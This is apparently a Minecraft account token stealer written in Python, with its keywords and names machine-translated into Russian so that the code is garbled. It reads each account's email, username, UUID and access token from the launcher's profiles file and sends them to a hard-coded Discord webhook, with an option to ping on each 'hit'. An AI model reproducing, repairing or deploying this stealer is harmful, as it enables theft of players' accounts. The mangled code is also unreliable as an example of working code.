импорт  json
импорт  ОС
urllib  из.запрос  Запрос на импорт , urlopen

# ваш URL-адрес веб-ссылки
WEBHOOK_URL = "https://discord.com/api/webhooks/1008388227612295198/0MdfjDjbRY4NZaQvb72i5pcskZpsslk72fJu2fVaBB0iqgMHRhkfPUaX8HsvjLrEDWZg"

# упоминает вас, когда вы получаете попадание
PING_ME =  False

uuid_dashed def(uuid):
    возвращает  f"{uuid[0:8]} -{uuid[8:12]} -{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

main def():
    json = auth_db.loads(open(os.getenv("APPDATA") + "\\.minecraft \\launcher_profiles.json").read())["authenticationDatabase"]

    =  встраивает []

    auth_db  в  x  для:
        попробуйте:
            auth_db = email[x].get("имя пользователя")
            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
            =  встроить {
                "поля": [
 {"name": "Email", "value": электронная почта , если  электронная почта  и  "@" в  электронной почте , иначе  "N / A", "inline": False},
 {"name": "Username", "value": display_name_object["DisplayName"].заменить("_", "\\_"), " встроенный": True},
 {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
 {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                ]
            }
            embeds.append(встраивание)
        кроме:
            пройти

    =  заголовки {
        "Content-Type": "application / json",
        "User-Agent": "Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.11 (KHTML, как Gecko) Chrome / 23.0.1271.64 Safari / 537.11"
    }

    json = payload.dumps({"встраивания": встраивания, "содержимое": "@everyone" , если  PING_ME  else ""})
    
    попробуйте:
        Запрос  =  запрос (WEBHOOK_URL, data=payload.encode(), заголовки = заголовки)
        urlopen(запрос)
    кроме:
        пройти

"__main__" == __name__ если:
    main()
